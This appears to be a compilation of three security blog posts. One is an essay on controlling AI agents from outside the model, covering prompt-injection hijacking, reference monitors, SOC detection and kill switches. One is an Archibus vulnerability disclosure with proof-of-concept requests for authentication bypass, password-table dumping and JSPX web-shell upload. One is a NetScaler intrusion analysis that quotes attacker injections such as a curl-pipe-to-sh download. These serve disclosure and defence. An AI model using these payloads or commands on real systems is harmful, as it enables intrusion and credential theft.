Title: Your Next Insider Threat Won’t be Human: Securing AI Agents From the Outside in
Context: The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story
Full Text:
Why the controls on an AI agent have to live outside of it, and what a security operations team can do to implement and maintain those controls.

The new privileged user in your environment

Security teams spent two decades learning how to work with the people they trust most. Domain admins, DBAs, finance approvers and contractors with VPN access all get a mature playbook: verified identity, scoped access, logged activity and a fast way to revoke it all.

Today, we’re navigating the same kind of access with regard to AI agents. They read our mailboxes, query our data lakes, open tickets, push code and increasingly, act on production systems. Unlike a new hire, an agent can’t be interviewed, background-checked or made to sign an acceptable-use policy.

The industry has largely settled on one framing: AI agents are the new insider threat but that label only tells us half of the story. It tells us who to worry about, not where the controls should sit. Our argument is that the answer is a security idea from 1972, the reference monitor, and that the SOC is where it gets enforced in practice.

Why agents break the trust model we had

With traditional software, a security incident ends in a root cause. You find the vulnerable function, the misconfigured rule or the bad commit, and you fix it. The behavior lived in code we could read.

Large language models don't give us that. We can't point to the training example or the set of weights that produced a specific decision. The same prompt can produce different actions on different runs. For a defender, that removes the most basic assumption we rely on: that the system will do tomorrow what it did today.

The attack surface changes too, and computer science has an old name for this problem: the confused deputy. This is a trusted program tricked into misusing its own authority on someone else's behalf. An agent that reads a poisoned email, web page or document and then acts on hidden instructions is a confused deputy with API keys. No password is stolen and no exploit fires, which makes the agent's permissions the real blast radius, not the model's intelligence.

Where the insider analogy holds, and where it breaks

Most discussion of agents as insiders focuses on two gaps: agents have no career to lose, and they act at machine speed. Both are real. From a detection and forensics seat, though, four other differences change the work more:

Difference

Human insider

AI agent

What it means for defenders

Monoculture

One person fails on their own

Many identical copies share one weakness

Treat a working injection like a wormable bug: fix the fleet, not one instance

Replayability

Events can be reconstructed and the person interviewed

The same input can produce a different action on a rerun

Forensics must rest on recorded inputs and tool calls, not on replaying the agent

Command channel

Instructions come from a manager

Instructions arrive mixed in with the data it processes

Any content the agent reads is a potential command

Self-report

A person can be questioned and cross-checked

Its account of its reasoning may not match what it did

Evidence must come from outside the agent

The last row matters most. We can't make an agent's self-reported reasoning the basis of trust, because we don't yet know how to guarantee that reasoning is faithful. Evidence has to come from outside the agent.

Put the controls outside the model

If the model can't be fully trusted, the controls that govern it can't live inside of it. A system prompt that says "never delete production data" is a suggestion, not a control. A well-crafted injection can talk the model out of it.

Security architects solved a version of this problem in the 1970s with the reference monitor: a mechanism that checks every access request, can't be bypassed and can't be tampered with by the program it governs. For AI agents, that means separating three things: the model that reasons, the harness that orchestrates it and the policy layer that decides which actions are actually allowed.

Figure 1: Agent control architecture · enforcement outside the model

The agent can propose anything, but only the enforcement point decides what reaches real systems, and every decision lands in a log the agent can't alter.

A security playbook for AI agents

None of these controls are new. What's new is applying them consistently to a non-human actor that reasons, plans and acts.

Give every agent its own identity. An agent should never run under a shared service account or a person's own credentials. It needs an identity that can be scoped, monitored, and revoked independently.

Enforce least privilege on actions, not just data. Define an explicit action space: which tools, which APIs, which parameters. High-impact actions like payments, deletions or production changes need step-up approval from a human.

Log everything in a place the agent can't touch. Every tool call, input, and output goes to tamper-evident storage outside the agent's reach. You should be able to reconstruct what happened without asking the agent.

Never let a model grade its own work. Use a different model, a deterministic rule, or a human to verify important outcomes. Avoid depending on a single model vendor for anything critical.

Red team continuously. Test prompt injection, tool misuse, data exfiltration, and edge cases, not just the happy path. Re-test every time the model, the prompt, or the tool set changes.

Build a kill switch before you need it. In May 2017, WannaCry was stopped by luck. A researcher registered a nonsense domain hard-coded in the ransomware, and new infections stopped spreading because the malware checked that domain before running. Defenders didn't build that kill switch. They found it in the attacker's code, it did nothing for machines already encrypted, and later variants simply removed it. Agent fleets can't depend on that kind of luck. The stop control has to be ours, sit outside the agent, cut off its credentials and tool access mid-run, and be tested regularly, the way an EDR host isolation action is.

Disclose and share incidents. When an agent misbehaves, tell the people affected, document which control failed and share the lessons with the wider community, the same way we share threat intelligence today.

Persistent memory is a new risk. Agents with long-term memory can be poisoned once and stay compromised. Add memory state to "log everything" and "quarantine its outputs."

Bring agents into the Security Operations Center (SOC)

Logging alone doesn't protect anyone, as no human team can review millions of agent actions, and handing that review to another unsupervised model just adds another black box. The SOC needs to treat agent activity as a first-class telemetry source, the way it treats endpoints, identities and cloud workloads today.

In practice, that means:

Behavioral baselines per agent. Know which tools, data sources and destinations each agent normally uses, and alert on deviations, such as a code-review agent that starts reading the finance file share.

Detections for agent-specific attacks. Write rules for prompt-injection indicators, unusual tool chaining, sudden bursts of high-privilege actions and data flowing to unexpected destinations.

Correlation with the rest of the environment. Tie agent actions to the user, the session, the content the agent read, and the systems it touched, so an investigation can follow the full chain.

Response playbooks. Pause the agent, revoke its tokens, quarantine its outputs and roll back its changes, with the same speed we expect when isolating a compromised host.

The security industry can lead in this area, as we already know how to collect noisy telemetry, find the signal, and contain threats quickly. Agents are the next category of asset to protect, and the next category of actor to watch.

Trust the architecture, not the model

Models will keep getting smarter, and vendors will keep promising they're safer. Both may be true, but neither removes our responsibility for what an agent does inside our environment with our data and our credentials.

The goal isn't to find a model we can trust completely. It's to build a system that stays safe even when the model gets it wrong. Security teams have done this for people, networks, and endpoints for decades. AI agents are simply the next privileged insider, and it's time we treated them that way.

Title: Authentication Bypass, Remote Code Execution, and Database Read in Eptura Archibus (FIXED)
Context: Credit This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy
Full Text:
Overview

While performing continuous red teaming exercises through Rapid7’s Vector Command service, Rapid7 discovered three new vulnerabilities in Eptura Archibus. A legacy API endpoint could be exploited to bypass authentication and run various functions without authentication (CVSS: 8.6 High). The most serious functions allow for full database read (CVSS: 8.5 High) and an insecure file upload (CVSS: 9.6 Critical). The insecure file upload leads to remote code execution.

Product description

Archibus helps organizations administer and manage their physical buildings, equipment, and real estate from a single central location. Users can track assets, maintenance work orders, real estate lease information, and desk or room reservations. According to Eptura, in 2023 over 16,000 companies and 40% of the Fortune 500 used Archibus.

Impact

A malicious actor with network access to the server via HTTP can read secrets and passwords out of the database. They can also run code to execute system commands as ‘NT AUTHORITY/Local Service’ and gain control of the server.

Credit

This vulnerability was discovered by Marcus Chang, Security Consultant at Rapid7 and is being disclosed in accordance with Rapid7's vulnerability disclosure policy.

CVE-2026-107186 - Archibus Authentication Bypass

The Archibus Web Central web application uses Java Direct Web Remoting (DWR) for various API functionality, which allows requests with multiple method calls. The isPasswordUppercase method sets a system session in the thread, and the runWorkflowRule method gets the set session for authentication. This allows malicious actors to run seemingly any workflow rule without providing authentication. Rapid7 tested the AbCommonResources-writeHTMLtoFile and AbCommonResources-getDataRecords workflow rules.

Technical Analysis

Most DWR methods require auth and DWR allows you to make multiple calls in a single request by editing the callCount parameter and adding other method parameters to the request.

DWR processes multiple calls in a single batch sequentially on the same thread. The SecurityServiceImpl.isPasswordUppercase() method is whitelisted for pre-auth access, and internally calls loadTableDef() which sets the core system user session on the thread-local ContextStore:

// SecurityServiceImpl.java - loadTableDef() private TableDef.ThreadSafe loadTableDef(String projectId, final String tableName) { Context context = ContextStore.get(); final Project.Immutable project = configManager.findProject(projectId); UserSession.Immutable coreUserSession = project.loadCoreUserSession(); context.setUserSession(coreUserSession); // <-- sets privileged session on context // ... }

DWRWorkflowService.runWorkflowRule() uses the privileged context set by isPasswordUppercase. If getUserSession() was invalid, it returns a session timeout, otherwise it continues execution. The end result is the workflow of the users choosing running without the user providing any authentication:

// DWRWorkflowService.java - runWorkflowRule() ContextCacheable.Immutable targetContext = ContextStore.get().getUserSession(); // ... if (targetContext == null) { handleSessionTimeout(workflowRuleName, workflowRuleInputs, result); return result; }

Exploitation

For exploitation, the scriptSessionId and PROJECT_ID are required. The DWR API requests are in the following format:

POST /archibus/dwr/call/plaincall/single.2.dwr Content-Type: text/plain Cookie: DWRSESSIONID=abc callCount=1 batchId=0 instanceId=0 page=%2F scriptSessionId=abc/def c0-scriptName=<SCRIPT_NAME> c0-methodName=<METHOD_NAME> c0-id=0 c0-param0=string:<PROJECT_ID>

The scriptSessionId can be obtained with this DWR request. The JSESSIONID can be obtained by browsing to /archibus/login.axvw:

POST /archibus/dwr/call/plaincall/__System.generateId.dwr HTTP/1.1 Content-Type: text/plain Cookie: JSESSIONID=<SESSION_ID>callCount=1 batchId=0 instanceId=0 c0-scriptName=__System c0-methodName=generateId c0-id=0 page=%2Farchibus%2Flogin.axvw scriptSessionId=

The Project_ID can be obtained with this request:

POST /archibus/dwr/call/plaincall/SecurityService.getProjects.dwr HTTP/1.1 Content-Type: text/plain Cookie: JSESSIONID=<SESSION_ID>; DWRSESSIONID=abccallCount=1 batchId=1 instanceId=0 nextReverseAjaxIndex=0 c0-scriptName=SecurityService c0-methodName=getProjects c0-id=0 page=%2Farchibus%2Flogin.axvw scriptSessionId=abc/def

Proof-of-Concept (POC) Example

Request To Run Workflow Rule Without Authentication

Obtain a scriptSessionId and the Project_ID. These can be obtained easily by sending a login request from the browser and viewing the request. This request to the DWR endpoint specifies two DWR method calls by specifying the callCount parameter as 2. The first method called is the isPasswordUppercase method. Its parameters begin with c0 in the POST body. It sets the user session in the context store with context.setUserSession(coreUserSession) via isPasswordUppercase. The second method called is the runWorkflowRule method which uses the context of the core user session which was set by the isPasswordUppercase method. Its parameters begin with c1. The end result is that any workflow can be run with the core user session without providing any credentials.

POST /archibus/dwr/call/plaincall/Multiple.2.dwr Content-Type: text/plain Cookie: DWRSESSIONID=abc callCount=2 batchId=0 instanceId=0 page=%2F scriptSessionId=abc/def c0-scriptName=SecurityService c0-methodName=isPasswordUppercase c0-id=0 c0-param0=string:<PROJECT_ID> c1-scriptName=workflow c1-methodName=runWorkflowRule c1-id=1 c1-param0=string:<RULE_NAME> c1-param1=Object_Object:{...params...} c1-param2=null:null"

Example Response

throw 'allowScriptTagRemoting is false.'; //#DWR-REPLY //#DWR-START# (function(){ if(!window.dwr)return; var dwr=window.dwr._[0]; dwr.engine.remote.handleCallback("0","0",false); dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:16,jsonExpression:null,message:"<WORKFLOW_OUTPUT>",output:null,value:null,xmlDocument:null}); })(); //#DWR-END#

CVE-2026-107187 - Archibus Database Read

The AbCommonResources-getDataRecords workflow allows users to read any database table, including usernames and passwords. This vulnerability can be chained with the authentication bypass vulnerability to read sensitive data from the database without authentication.

Technical Analysis

Using the earlier auth bypass vulnerability, the AbCommonResources-getDataRecords workflow is callable without authentication. This maps to the ViewHandlers method that operates on any Archibus-managed table:

// ViewHandlers.java - getDataRecords() public void getDataRecords(EventHandlerContext context) { // ... String restriction = context.getString("restriction"); // ... String recordSql = dataSource.formatSqlQuery(restriction, sortValues, filterValues, true, false); }

Authenticated users may also be able to send the request without performing the auth bypass. The code checks if a user in the workflow rules security group. An exception is thrown if the user is not. Rapid7 did not check if the workflow request was able to be sent as a standard user.

// WorkflowRulesContainerImpl.java - line 499 public void checkPermission(WorkflowRule.Immutable workflowRule, ContextCacheable.Immutable context, String methodName) throws ExceptionBase { UserAccount.Immutable userAccount = context.findUserSession().getUserAccount(); String ruleKey = workflowRule.getKey(); if (!userAccount.isMemberOfGroup(workflowRule.getSecurityGroup())) { throw new ExceptionBase("Your account does not belong to the security group..."); } else if (!workflowRule.isActive()) { throw new ExceptionBase("This rule is not active at your site..."); } // ... }

Proof-of-Concept (POC) Example

After obtaining a scriptSessionId and the Project_ID, which can be obtained easily by sending a login request from the browser and viewing the request, a malicious actor can leverage the auth bypass vulnerability. They can set the second call in the DWR request for the AbCommonResources-getDataRecords workflow. The afm_users table can be queried to view usernames and passwords.

Request

POST /archibus/dwr/call/plaincall/Multiple.2.dwr HTTP/1.1 Host: TARGET Content-Type: text/plain callCount=2 batchId=0 instanceId=0 page=%2F scriptSessionId=abc/def c0-scriptName=SecurityService c0-methodName=isPasswordUppercase c0-id=0 c0-param0=string:<PROJECT_ID> c1-scriptName=workflow c1-methodName=runWorkflowRule c1-id=1 c1-param0=string:AbCommonResources-getDataRecords c1-param1=Object_Object:{tableName:reference:c1-e1,fieldNames:reference:c1-e2,indexField:reference:c1-e3,indexLevel:reference:c1-e4,indexValue:reference:c1-e5,sortValues:reference:c1-e6,filterValues:reference:c1-e7,restriction:reference:c1-e8,controlId:reference:c1-e9,recordLimit:reference:c1-e10} c1-e1=string:afm_users c1-e2=string:['afm_users.user_name', 'afm_users.user_pwd'] c1-e3=string:afm_users.user_name c1-e4=string:0 c1-e5=string: c1-e6=string:[] c1-e7=string:[] c1-e8=string:1=1 c1-e9=string:control-1 c1-e10=string:10000 c1-param2=null:null

Response

throw 'allowScriptTagRemoting is false.'; //#DWR-REPLY //#DWR-START# (function(){ if(!window.dwr)return; var dwr=window.dwr._[0]; dwr.engine.remote.handleCallback("0","0",false); dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:13,jsonExpression:"{\"primaryKeyIds\":[\"afm_users.user_name\"],\"records\":[{\"afm_users.user_name\":\"PASSWORD\",\"afm_users.user_pwd\":\"PASSWORD\",\"afm_users.user_name.key\":\"PASSWORD\"}]...

Below is a snippet of what the request and response looks like on a live system. The user_name , user_pwd, email, and role_name columns are extracted from the afm_users table where role_name is ‘SYSTEM ADMINISTRATOR (ACP)’.

Figure 1: Reading Passwords And Emails In User Table b

CVE-2026-107188 - Archibus Unrestricted File Upload

The AbCommonResources-writeHTMLtoFile workflow writes user-controlled content to disk with a user-controlled file extension and no validation. This allows users to write JSPX code to browsable locations, which will execute when browsed to. This vulnerability can be chained with the auth bypass vulnerability to upload executable code without auth.

Technical Analysis

The AbCommonResources-writeHTMLtoFile workflow writes user-controlled content to disk with a user-controlled file extension and no validation:

// ViewHandlers.java - writeHTMLtoFile() public void writeHTMLtoFile(EventHandlerContext context) { String htmlDoc = (String) context.getParameter("html"); // attacker controls content String extension = (String) context.getParameter("fileExtension"); // attacker controls extension // ... File outputFile = File.createTempFile("DataViewReport", "." + extension, outputDir); BufferedWriter xlsOut = new BufferedWriter(new FileWriter(outputFile)); xlsOut.write(htmlDoc); // writes attacker content to disk xlsOut.close(); }

Proof-of-Concept (POC) Example

Step 1

Obtain a scriptSessionId and the Project_ID. These can be obtained easily by sending a login request in the browser and viewing the request. This vulnerable workflow can be chained with the auth bypass vulnerability to upload JSPX files without authentication. The server responds with the filename it generated, along with the browsable file path. Browsing to files uploaded with the JSP extension would trigger an authentication redirect. Browsing to files uploaded with the JSPX file extension didn’t force a redirect, so attacker JSPX code could be executed without authentication when browsing to the file.

Request

POST /archibus/dwr/call/plaincall/Multiple.2.dwr HTTP/1.1 Host: TARGET Content-Type: text/plain callCount=2 batchId=0 instanceId=0 page=%2F scriptSessionId=abc/def c0-scriptName=SecurityService c0-methodName=isPasswordUppercase c0-id=0 c0-param0=string:<PROJECT_ID> c1-scriptName=workflow c1-methodName=runWorkflowRule c1-id=1 c1-param0=string:AbCommonResources-writeHTMLtoFile c1-param1=Object_Object:{html:reference:c1-e1,fileExtension:reference:c1-e2} c1-e1=string:<JSPX_WEBSHELL_CONTENT> c1-e2=string:jspx c1-param2=null:null

The response includes the generated browsable file path.

Response

throw 'allowScriptTagRemoting is false.'; //#DWR-REPLY //#DWR-START# (function(){ if(!window.dwr)return; var dwr=window.dwr._[0]; dwr.engine.remote.handleCallback("0","0",false); dwr.engine.remote.handleCallback("0","1",{code:"executed",detailedMessage:null,executionTime:16,jsonExpression:"{\"exportFileName\":\"\\\/archibus\\\/schema\\\/\\\/per-site\\\/\\\/exportReports\\\/\\\/DataViewReport<TIMESTAMP>.jspx\"}",message:null,output:null,value:null,xmlDocument:null}

Step 2

Browse to the file path.

curl https://TARGET/archibus/schema/per-site/exportReports/DataViewReport<TIMESTAMP>.jspx

Rapid7 exploited the vulnerability on a Vector Command customer's server. As a first proof of concept, a JSPX file to print the server time was uploaded.

Figure 2: Inserted Java Code To Print Server Time

Remediation

Users should update Archibus to version 2025.02 or higher. The vulnerable DWR method used for auth bypass was moved to a REST API in version 2025.02. Users should sign into their Eptura account to download the Archibus installer.

Title: Rapid7 Analysis: NetScaler intrusions chaining CVE-2026-88771 and CVE-2026-88779
Full Text:
Overview

In early October 2026, Rapid7 analysts investigated a compromise of a Citrix NetScaler ADC appliance. The appliance was running an affected 14.1 build and was exposed to active exploitation targeting NetScaler authentication and SAML deployments.

The intrusion achieved root code execution, deployed multiple persistence mechanisms, installed PHP web shells, created outbound command-and-control and internal tunnelling capabilities, performed targeted reconnaissance of DNS, LDAP/Active Directory, management services and VMware vCenter infrastructure, and exfiltrated NetScaler configuration and key material.

The activity overlaps with public reporting on the WHIPSHOT/SLAPSHOT NetScaler campaign. However, this case provides additional detail on the operational lifecycle, including repeated post-reboot execution through the crash-handling workflow, HA-aware persistence, a dedicated Go reconnaissance tool, a separate FreeBSD proxy agent, and a staged collection pipeline.

Key findings

The first confirmed root execution occurred shortly after attacker-controlled text was inserted into a NetScaler authentication username.

The injected text caused or immediately preceded repeated nsaaad crashes and a Pitboss reboot.

After reboot, the NetScaler call-home crash handler processed the retained attacker-controlled text and executed a payload as root.

The attacker installed cookie-authenticated PHP web shells behind CSS-looking Apache aliases.

The attacker set /bin/sh to mode 6555, allowing an unprivileged web process to obtain effective root privileges.

The implant framework maintained access through cron, rc.netscaler, watchdog loops, an outbound reverse agent, and an HTTP-fronted TCP proxy.

HA synchronization and forced failover logic attempted to preserve access across the appliance pair.

A Go tool mapped internal routes, DNS, LDAP/AD, management services and VMware vCenter systems.

NetScaler configuration, historical configurations, HTTP configuration, diagnostics and system backup material were staged for exfiltration.

Technical Analysis

Initial access

The first event was an authentication request containing attacker-controlled text similar to:

pitboss PPE unexpectedly died NSPPE;fetch${IFS}-qo${IFS}/v ...;sh${IFS}/v;#

The observed chain was:

Figure 1: Sequence diagram showing the attack chain

Logs collected show attackers chaining CVE-2026-88771, the pre-authentication log-poisoning/RCE issue, with CVE-2026-88779, the separate SAML-parsing crash. A two-vulnerability sequence in which the SAML parsing flaw supplies a crash/reboot condition while the log-poisoning flaw supplies attacker-controlled command text.

The evidence demonstrates more than an attempted chain: the injected command, nsaaad crash loop, Pitboss reboot, post-reboot handler activity, and root payload execution are all directly correlated across independent logs and filesystem timestamps. The first implant files were created at the same second as the first logged post-reboot execution, and later stages, web shells, tunnels, reconnaissance tooling and exfiltration were confirmed.

Rapid7 also published an ETR on the Netscaler zero days currently exploited in the wild.

Repeated post-reboot execution

The initial execution was not a one-time event. The appliance recorded repeated Pitboss-initiated reboots and repeated call-home handler executions over several days.

The handler re-executed stages from multiple infrastructure addresses and the repeated execution model allowed the operator to refresh persistence, deploy new components and continue collection after appliance restarts.

The crash-handling path functioned as a delayed and repeatable execution trampoline, the chaining happened to avoid waiting 24h for the injected payload to run.

Payload evolution

Two .slap dropper versions were recovered:

17447d.sh (earlier version) SHA-256: a0ba4e1ad622d9c3d950b4156d4430812d05bee216ab22c3804a9f7a80535556

and:

1.sh SHA-256: 6774bfed99da38cec82e721de4bd64a67db7840efadcc71e7df02eb6f0a03c44

The later version added reverse-agent functionality, relay installation, HA recovery, stage tracking, and structured upload logging, indicating operational maturation during the campaign.

The nsvmd installer branch was separately identified as:

2.sh / r.sh SHA-256: 56a892d80096a9db4ca473a9c3109729c60a5ba901d6ba65948bdb1f4a6fb186

Persistence and web shells

The main framework used a directory under /nsconfig/.slap.

/nsconfig/.slap/vc /nsconfig/.slap/vcscan-agent.sh /nsconfig/.slap/agent.pl /nsconfig/.slap/bridge.pl /nsconfig/.slap/boot.sh /nsconfig/.slap/reverse-agent.sh

It deployed three web shell copies into the LogonPoint custom web directory:

.slap.receiver .ctxs.receiver receiver.deb

The shells used a cookie-based command channel. Commands were supplied through a second cookie and returned through an HTTP 404 response body. The 404 response helped the shell blend into normal web traffic and made successful command requests resemble missing resources.

The attacker modified Apache configuration to:

execute .deb files as PHP;

enable PHP execution;

map CSS-looking URLs to .slap.receiver;

accept randomized hexadecimal CSS suffixes;

preserve an attacker backup of the HTTP configuration.

The alias created were the following:

/logon/LogonPoint/custom/receiver.v2.min.css /logon/LogonPoint/custom/receiver.v2.min.<hex>.css ↓ /var/netscaler/logon/LogonPoint/custom/.slap.receiver

TA repeatedly set:

chmod 6555 /bin/sh

This made the shell setuid and setgid. Because Apache normally runs with reduced privileges, this provided a path for the PHP web shell to obtain effective root privileges.

The framework also reseeded cron entries and boot hooks whenever it ran. This made the compromise resilient to reboots, image regeneration and loss of individual cron entries.

Tunnelling and command channels

The intrusion deployed multiple redundant access paths.

Perl TCP session manager

agent.pl created a loopback listener on an ephemeral port and recorded it in /tmp/.uxdport

It used /tmp/.uxdlock for process coordination and supported operations including:

ping open push pull exch close

The open operation accepted arbitrary destination hosts and ports, turning the NetScaler into an internal TCP pivot.

Python HTTP tunnel

The Python components provided a local session manager and HTTP front end:

it accepted base64 commands in an HTTP header and returned tunnel responses in HTTP 404 bodies. This behavior overlaps with publicly reported WHIPSHOT/SLAPSHOT tooling.

Outbound reverse agent

The reverse agent polled an external command endpoint every 15 seconds, executed the received command with /bin/sh -c, and returned output using HTTP PUT. This gave the operator command execution without requiring an inbound connection to the appliance.

HA-aware persistence

The framework included explicit HA recovery logic:

sync HA files all force HA failover

The code attempted to synchronize implant files to the HA peer and, when appropriate, force failover so the node containing the implant became active.

Internal reconnaissance

A stripped, statically linked FreeBSD Go binary was recovered from the .slap directory. The tool was designed to map infrastructure reachable from the compromised appliance.

It contains functionality associated with:

local interface and route parsing;

gateway-prefix discovery;

subnet expansion;

DNS server and domain discovery;

DNS zone-transfer hunting;

LDAP anonymous bind and RootDSE queries;

LDAP searches;

management-service checks;

TLS certificate inspection;

VMware vCenter classification.

A launcher named vcscan-agent.sh downloaded and validated the scanner as scanner-freebsd-amd64, installed it as /nsconfig/.slap/vc, and ran two stages: broad scanning of RFC1918 space and management-focused scanning of ranges derived from DNS and LDAP results. The launcher collected route, DNS, LDAP, management and vCenter results into files such as:

vcpersist-<token>_dns_candidates.tsv vcpersist-<token>_dns_ldap_verified.tsv vcpersist-<token>_vcenter_verified_all.txt

It then compressed and uploaded the results to the operator infrastructure.

This reconnaissance component addition confirms the campaign is active and developing, mapping the identity, management and virtualization infrastructure from a compromised ADC vantage point.

nsvmd proxy

The second payload branch deployed a FreeBSD Go agent named nsvmd through injection of 2.sh/r.sh under /flash/.nsvm/nsvmd:

curl${IFS}-sSLk${IFS}https://v5v.in/r.sh?k=<token>|sh

The agent was started with:

nsvmd -server v5v.in:443 -sni c.v5v.in

The installer created a 45s watchdog (/flash/.nsvm/watchdog.sh), boot persistence through /nsconfig/rc.netscaler, 5 minute and daily cron persistence (/flash/.nsvm/guard.sh,/flash/.nsvm/restart.sh) marking nsvmd immutable using chflags uchg. Agent logs were collected under /flash/.nsvm/.agent.log and /flash/.nsvm/.wd.log.

Configuration and key-material collection

The attacker staged and uploaded:

/nsconfig/ ns.conf.0 through ns.conf.4 ns.conf.bak /etc/httpd.conf system backup archives implant diagnostics

The configuration archive could contain encrypted credentials, LDAP/RADIUS bind information, administrative configuration, SSL private keys and key-encryption material. The collection logic also uploaded manifests and stage logs and retried failed uploads.

A separate archive was staged in the web root and successfully downloaded through an HTTP 200 request. The response size matched the staged archive size, providing direct evidence of configuration exfiltration through the web interface.

Defensive recommendations

Patch NetScaler appliances to the applicable CVE-2026-88779 and CVE-2026-88771 fixed builds and verify the earlier CTX697096 fixes.

Treat Internet-facing appliances as potentially compromised if they were vulnerable during the campaign window.

Collect volatile evidence before rebooting or rebuilding when compromise is suspected.

Inspect both nodes of every HA pair.

Hunt for the .slap, .relay and .nsvm paths.

Hunt for setuid /bin/sh, unauthorized Apache PHP handlers and CSS-looking aliases.

Search for nsaaad crashes, Pitboss reboots and ns_monuploadd_err.pl execution records.

Rotate all credentials and keys exposed through /nsconfig, including LDAP/RADIUS credentials and encryption-related material.

Review outbound traffic for the listed infrastructure and internal scanning from NetScaler source addresses.

Conclusion

This incident demonstrates how a NetScaler compromise can evolve from a pre-authentication injection into a persistent appliance-resident intrusion platform. The attacker combined web shells, setuid privilege persistence, outbound command execution, internal TCP tunnelling, HA manipulation, environment reconnaissance and automated configuration exfiltration.

The most significant new findings are the observed chaining of CVE-2026-88779 and CVE-2026-88771 and the dedicated reconnaissance workflow. Rather than using the ADC only as a foothold, the operator used it as a privileged vantage point to map internal networks, identity services, management infrastructure and virtualization systems. This provides defenders with additional high-value hunting opportunities and shows why patching alone is insufficient after an Internet-facing NetScaler has been exposed to active exploitation.
